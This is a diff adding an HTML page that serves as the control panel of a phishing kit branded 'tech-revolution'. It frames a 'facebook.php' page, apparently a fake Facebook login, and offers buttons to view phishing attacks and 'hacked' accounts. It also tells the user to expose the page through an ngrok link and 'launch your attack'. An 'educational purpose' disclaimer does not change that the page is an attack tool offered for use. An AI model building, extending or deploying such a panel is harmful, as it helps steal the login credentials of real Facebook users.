@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<style>
+
+body,html{
+
+background:white;
+
+margin:0;
+
+padding:0;
+
+}
+*{box-sizing:border-box;}
+.b{
+float:right;
+
+background:green;
+
+background:bold;
+
+color:white;
+
+margin:2px;}
+
+.icon{
+
+background:url(icon.JPG);
+
+width:48px;
+
+height:2.3em;
+
+background-position-y:-5px;
+
+background-position-x:-7px;
+
+display:block;
+
+float:left;
+
+border-radius:2px;
+}
+
+.icon1{
+background:url(icon.JPG);
+
+width:94px;
+
+height:2em;
+
+display:block;
+
+background-position-y:-7px;
+
+background-position-x:-75px;
+
+float:left;
+
+margin-left:2px;
+
+border-radius:70px;
+
+margin-top:3px;
+}
+
+.header{
+
+background:black;
+}
+.header::after{
+content:"";
+
+clear:both;
+
+display:block;
+
+}
+.tech{
+margin-bottom:15px;
+ margin-top:23px; 
+text-transform:capitalize; 
+ font-size:xx-large;
+width:280px;
+ color:white; 
+border-radius:5px;
+ background:purple;;
+}
+.tech1{
+ border-radius:100%;
+ width:20px;
+ height:20px;
+ margin-left:18px;
+ margin:top:3px;
+ margin-bottom:3px;
+ display:inline-block; 
+background:white;}
+.hk{
+font-size:xx-large;
+ visibility:visible;
+ background:#ffffd1; 
+border-radius:14px;
+ outline:2px solid green;
+ width:300px;
+ text-transform:uppercase; 
+font-family:fantasy;
+color:black;}
+.ah{
+display:block;
+}
+.ba{ 
+with:100%;
+ background:green;
+color:white; 
+margin:5px 0; font-size:large;
+ font-family:fantasy;
+ text-transform:capitalize;}
+.cau{
+width:280px;
+margin-right:14px;
+margin-top:5px;
+font-family:corbel;
+background:light-gray;
+text-transform:capitalize;
+font-size:large;
+outline:2px solid white;
+}
+.cau::before{
+content:"caution";
+color:red;
+font-family:fantasy;
+font-size:xx-large;
+display:block;
+}
+.on{background:grey;
+width:40%;
+outline:white;
+float:left;
+}
+.of{
+float:right;
+width:60%;
+}
+.float::after{
+content:"";
+display:block;
+clear:both;}
+.of:hover>.note{
+display:block;
+font-size:large;
+color:purple;
+}
+.note{display:none;}
+#yi{display:none;}
+#yi:target{
+visibility:visible;
+color:black;}
+
+</style>
+</head>
+<body>
+<header>
+<div>
+<div class="header"><span class="icon"></span><span class="icon1"></span><div>
+<button class="b">signup</button><button class="b">login</button></div>
+</div>
+</header>
+<div class="tech">
+<div class="tech1">
+</div>tech-revolution</div>
+<div class="float">
+<div class="of">
+<div style=" color:red; font-size:xx-large; background:black;">
+View Panel</div>
+<iframe width="99%" height="300px" name="if">
+facebook.com
+</iframe>
+<div class="note" style="font-weight:bold;" >facebook is the only page available<br>
+<a  href="#yi"><button style=" background:black;color:white;">generate link</button></a></div>
+</div>
+<div id="yi">copy the link from ngrok and add/facebook.php<br>
+congratulation you can now launch your attack</div>
+<div class="on">
+<div class="hk">
+<div style="background:white;">hacker's community</div>
+<a href="facebook.php" target="if" class="ah" >
+<button class="ba">view available phishing attack </button></a>
+<a href="#" class="ah"><button class="ba">view your hacked account</button></a>
+<a href="#" class="ah"><button class="ba">how to hacked with our platform</button></a>
+</div>
+<div style="color:blue;background:black; text-transform:uppercase; width:60%; outline:5px solid blue;">
+<h1>cyber hacker</h1>
+</div>
+<div class="cau">
+this platform is created by:<br><strong>tech-revolution</strong>
+we shall not be responsible of any misuse of this platform
+it is created for educational purpose
+what ever illegal activities you do with our plaform it is at your own risk
+</div>
+</div>
+</div>
+<footer style=" text-align:center; width=100%; background:black; color:white">
+<div style=" font-size:large; margin:0 auto;">&copy 2023</div></footer>
+
+</body>
+</html>
